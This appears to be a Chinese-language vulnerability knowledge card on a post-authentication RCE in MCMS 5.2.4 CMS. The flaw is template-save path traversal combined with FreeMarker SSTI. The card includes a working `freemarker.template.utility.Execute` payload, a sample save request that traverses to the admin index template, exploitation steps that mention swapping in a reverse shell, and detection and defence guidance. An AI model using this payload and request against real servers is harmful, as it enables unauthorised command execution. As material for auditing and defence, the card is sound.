---
id: web-generic-ssti-mcms-template-save-freemarker-execute
title: MCMS 5.2.4 后台模板编辑路径穿越写 FreeMarker 模板：?new Execute 注入后台首页触发 RCE
type: scenario
domain: web
path: web/generic/ssti
technique: cms-template-save-path-traversal-freemarker-execute
aliases:
- MCMS 模板注入
- MCMS FreeMarker RCE
- 后台模板编辑 getshell
- ?new Execute
- freemarker.template.utility.Execute
- templets 路径穿越
tags:
- web
- java
- mcms
- mingsoft
- freemarker
- ssti
- rce
- template
- path-traversal
cve: []
severity: high
confidence: medium
affected_versions: MCMS（MingSoft CMS）5.2.4（原文审计版本；其他版本未验证）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V223
  verified_at: '2026-11-07T06:48:17+08:00'
  notes: 已通读原文并逐张核对本地61张图：模板保存/SSTI 章节的远程 xz.aliyun.com 截图未包含在本地 img（本地图32-42仅为 uploadTemplate 上传与 template/1/default 落盘），卡片依据正文对保存逻辑（后缀黑名单 .exe/.jsp、templets 路径仅按 / 与 \ 判断、未过滤 ../、写入后台首页模板）与 FreeMarker Execute payload 撰写，正文与卡一致；confidence=medium 合理。dedup_review 的 --force 理由成立：与 FastCMS 卡同为 ?new Execute sink，但产品/版本/入口不同，且本卡多出 templets 路径穿越覆盖后台首页。未验证点：保存接口精确 URL/参数名未在本地图出现（卡内已标注需抓包确认）；PoC未复跑；frontmatter无 sources/source_url；affected_versions按原文审计版本MCMS 5.2.4标注。
---

## 一句话结论

MCMS 后台模板编辑/保存功能只用黑名单拦 `.exe`、`.jsp` 后缀，`templets` 目标路径只做简单分隔符判断、不过滤 `../`，可跨目录覆盖任意 FreeMarker 模板文件；在 FreeMarker 版本/配置允许 `?new()` 且解析器未限制 `freemarker.template.utility.Execute` 时，把 `<#assign value="freemarker.template.utility.Execute"?new()>${value("whoami")}` 写进后台首页模板，访问后台即可执行任意命令。

## 原理

- **写入点**：模板保存逻辑先取 `fileName` 的后缀与 `uploadFileDenied`（`.exe,.jsp`）比较，随后用 `templets` 参数确定目标路径；路径处理只判断字符串中是否有 `/` 或 `\`，有则直接拼接返回，没有则走 else 分支，全程没有规范化 `../`，因此可从模板目录跳到任意模板文件。
- **内容可控**：保存的模板内容来自请求体，原样写入文件；后台模板由 FreeMarker 渲染，写入的 `${...}` 会在下一次访问时执行。
- **FreeMarker 利用**：`?new()` 是 FreeMarker 的实例化内建函数；在允许 `freemarker.template.utility.Execute`（默认 `TemplateClassResolver.UNRESTRICTED_RESOLVER` 或未启用 `SAFER_RESOLVER`）时，`Execute` 的 `exec(String)` 直接调用 `Runtime.exec`，返回命令输出并渲染到页面。
- **为什么能 RCE**：模板文件本身是可执行模板，写入等于代码注入；黑名单只针对 `.exe/.jsp`，不拦 `.html`/`.ftl` 或任意模板文件名；路径穿越让攻击者覆盖高流量页面（如后台首页）确保触发。

## 触发条件

- 已登录 MCMS 后台并拥有模板管理/编辑权限。
- 目标 FreeMarker 版本与配置允许 `?new()` 实例化 `freemarker.template.utility.Execute`（MCMS 5.2.4 默认依赖满足原文测试）。
- 模板保存接口对 `templets` 路径未做规范化（原文审计版本）。

## 利用步骤

1. 登录后台，进入“模板管理”，选择要编辑的模板文件（原文选择后台主页模板）。
2. 复制原模板内容，在开头加入 payload，保持其余内容不变以避免页面被破坏：
   ```
   <#assign value="freemarker.template.utility.Execute"?new()>${value("whoami")}
   ```
3. 保存并抓包，记录保存接口与 `templets`/内容参数；将 `templets` 改为目标模板路径（可含 `..` 跨目录）。
4. 提交保存，服务端把带 payload 的内容写入模板文件。
5. 访问后台首页（或对应渲染页面），`whoami` 命令执行结果被渲染/回显。
6. 将命令替换为反弹 shell 或文件写入等载荷，完成 RCE。

## PoC

```text
<#assign value="freemarker.template.utility.Execute"?new()>${value("whoami")}
```

保存请求示意（参数名以实际抓包为准）：

```http
POST /ms/template/save.do HTTP/1.1
Host: target:8081
Cookie: JSESSIONID=<后台会话>
Content-Type: application/x-www-form-urlencoded

templets=..\..\..\..\..\src\main\webapp\WEB-INF\templates\admin\index.html&content=<#assign value="freemarker.template.utility.Execute"?new()>${value("whoami")}
```

说明：原文通过后台模板编辑界面保存并访问后台，远程截图显示命令执行；本地抓取的 61 张图片只覆盖到模板 ZIP 解压与删除部分，保存接口的精确参数名/URL 未在本地图片中，需按实际环境抓包确认，故本条 confidence 标为 medium。

## 变体与关联

- **FreeMarker 其他 gadget**：`?api`、`ObjectConstructor`、`JythonRuntime`、`TemplateClassResolver` 绕过；见 [[web-generic-ssti-freemarker-safer-resolver-bypass]]。
- **同类后台模板编辑 RCE**：[[web-generic-ssti-fastcms-template-edit-freemarker-rce]]（FastCMS 0.1.5）。
- **文件写入原语**：[[web-java-component-mcms-template-unzip-zipslip]]（同项目 Zip Slip 写 webapp）。
- **检测防御**：模板保存接口出现 `?new`、`Execute`、`freemarker.template.utility` 等关键字；把 FreeMarker 配置为 `TemplateClassResolver.SAFER_RESOLVER` 并禁用 `?new`；模板路径白名单 + `getCanonicalPath` 校验；模板编辑功能最小权限与审计。

## 检测与防御

- **检测**：模板文件被写入含 `${...}`/`<#assign ... ?new()>` 的内容；模板管理保存请求的 `templets` 参数含 `..`；访问后台出现命令输出。
- **防御**：升级/配置 FreeMarker 使用 `SAFER_RESOLVER`；模板保存只允许白名单目录与文件名并用规范化路径校验；禁用后台在线编辑模板或加二次确认与审计；对模板内容做静态检测。
